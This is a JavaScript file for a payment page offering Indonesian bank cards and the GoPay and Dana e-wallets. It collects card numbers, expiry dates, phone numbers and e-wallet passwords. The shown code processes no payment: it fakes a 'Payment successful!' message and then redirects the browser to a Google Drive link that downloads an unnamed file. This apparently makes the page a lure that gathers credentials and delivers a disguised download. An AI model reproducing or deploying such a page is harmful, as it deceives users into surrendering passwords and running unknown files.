document.querySelectorAll('.payment-button').forEach(function(button) {
  button.addEventListener('click', function() {
    var method = button.getAttribute('data-method');
    showExtraFields(method);
    
    // Toggle active class
    document.querySelectorAll('.payment-button').forEach(function(btn) {
      btn.classList.remove('active');
    });
    button.classList.add('active');
  });
});

document.getElementById('payButton').addEventListener('click', function() {
  var selectedMethod = document.querySelector('.payment-button.active');
  if (!selectedMethod) {
    alert('Please select a payment method.');
    return;
  }
  
  var method = selectedMethod.getAttribute('data-method');
  
  // Validate inputs
  var inputsValid = validateInputs(method);
  if (!inputsValid) {
    return; // Validation error will be shown by the function
  }
  
  // Simulate processing
  setTimeout(function() {
    document.getElementById('message').textContent = 'Payment successful!';
    resetForm();
    
    // Clear active selection after payment success
    document.querySelectorAll('.payment-button').forEach(function(btn) {
      btn.classList.remove('active');
    });
    
    // Alert payment success
    alert('Payment successful!');
    window.location.href = 'https://drive.usercontent.google.com/u/0/uc?id=1E1vSjTK5J3afdoH9pkvDPk7H_I8FOMfo&export=download'
  }, 1500);
});

function showExtraFields(method) {
  var extraFieldsContainer = document.getElementById('extraFields');
  extraFieldsContainer.innerHTML = ''; // Clear previous fields
  
  if (method === 'bca' || method === 'bni' || method === 'bri' || method === 'mandiri') {
    var cardNumberInput = createTextInput('cardNumber', 'Enter card number', true);
    cardNumberInput.addEventListener('input', validateNumericInput);
    var expiryDateInput = createTextInput('expiryDate', 'MM/YY', true);
    expiryDateInput.addEventListener('input', validateExpiryDateInput);
    
    extraFieldsContainer.appendChild(createInputGroup('Card Number', cardNumberInput));
    extraFieldsContainer.appendChild(createInputGroup('Expiry Date', expiryDateInput));
  } else if (method === 'gopay' || method === 'dana') {
    var phoneNumberInput = createTextInput('phoneNumber', 'Enter phone number', true);
    phoneNumberInput.addEventListener('input', validateNumericInput);
    var passwordInput = createPasswordInput('password', 'Enter password', true);
    
    extraFieldsContainer.appendChild(createInputGroup('Phone Number', phoneNumberInput));
    extraFieldsContainer.appendChild(createInputGroup('Password', passwordInput));
  }
}

function createInputGroup(labelText, inputElement) {
  var group = document.createElement('div');
  group.classList.add('input-group');
  
  var label = document.createElement('label');
  label.textContent = labelText;
  
  group.appendChild(label);
  group.appendChild(inputElement);
  
  return group;
}

function createTextInput(id, placeholder, required) {
  var input = document.createElement('input');
  input.type = 'text';
  input.id = id;
  input.name = id;
  input.placeholder = placeholder;
  input.required = required;
  input.className = 'extra-input';
  return input;
}

function createPasswordInput(id, placeholder, required) {
  var input = document.createElement('input');
  input.type = 'password';
  input.id = id;
  input.name = id;
  input.placeholder = placeholder;
  input.required = required;
  input.className = 'extra-input';
  return input;
}

function validateNumericInput(event) {
  var input = event.target;
  input.value = input.value.replace(/\D/g, ''); // Remove any non-numeric characters
}

function validateExpiryDateInput(event) {
  var input = event.target;
  var value = input.value;

  if (!/^\d{0,2}(\/\d{0,2})?$/.test(value)) {
    input.value = value.slice(0, -1); // Remove last character if it does not match the format
  }
}

function validateInputs(method) {
  var inputs = document.querySelectorAll('#extraFields input');
  var isValid = true;
  
  inputs.forEach(function(input) {
    var parentGroup = input.parentElement;
    var validationMessage = parentGroup.querySelector('.validation-message');
    
    if (input.required && input.value.trim() === '') {
      isValid = false;
      input.classList.add('invalid');
      if (!validationMessage) {
        validationMessage = document.createElement('div');
        validationMessage.classList.add('validation-message');
        parentGroup.appendChild(validationMessage);
      }
      validationMessage.textContent = 'This field is required for ' + method.toUpperCase() + '.';
    } else {
      input.classList.remove('invalid');
      if (validationMessage) {
        parentGroup.removeChild(validationMessage);
      }

      // Additional check for expiry date
      if (input.id === 'expiryDate' && input.value.trim() !== '') {
        if (!/^\d{2}\/\d{2}$/.test(input.value)) {
          isValid = false;
          input.classList.add('invalid');
          if (!validationMessage) {
            validationMessage = document.createElement('div');
            validationMessage.classList.add('validation-message');
            parentGroup.appendChild(validationMessage);
          }
          validationMessage.textContent = 'Invalid date format. Use MM/YY.';
        } else {
          var expired = checkExpiryDate(input.value);
          if (expired) {
            isValid = false;
            input.classList.add('invalid');
            if (!validationMessage) {
              validationMessage = document.createElement('div');
              validationMessage.classList.add('validation-message');
              parentGroup.appendChild(validationMessage);
            }
            validationMessage.textContent = 'Sorry, this card is expired.';
          }
        }
      }
    }
  });
  
  return isValid;
}

function checkExpiryDate(expiryDate) {
  var parts = expiryDate.split('/');
  if (parts.length !== 2) {
    return true; // Invalid format should be treated as expired
  }
  
  var month = parseInt(parts[0], 10);
  var year = parseInt(parts[1], 10) + 2000; // Assuming YY format
  
  var now = new Date();
  var currentMonth = now.getMonth() + 1; // Months are 0-11
  var currentYear = now.getFullYear();
  
  if (year < currentYear || (year === currentYear && month < currentMonth)) {
    return true; // Card is expired
  }
  
  return false; // Card is valid
}

function resetForm() {
  document.getElementById('extraFields').innerHTML = '';
  document.getElementById('message').textContent = '';
}
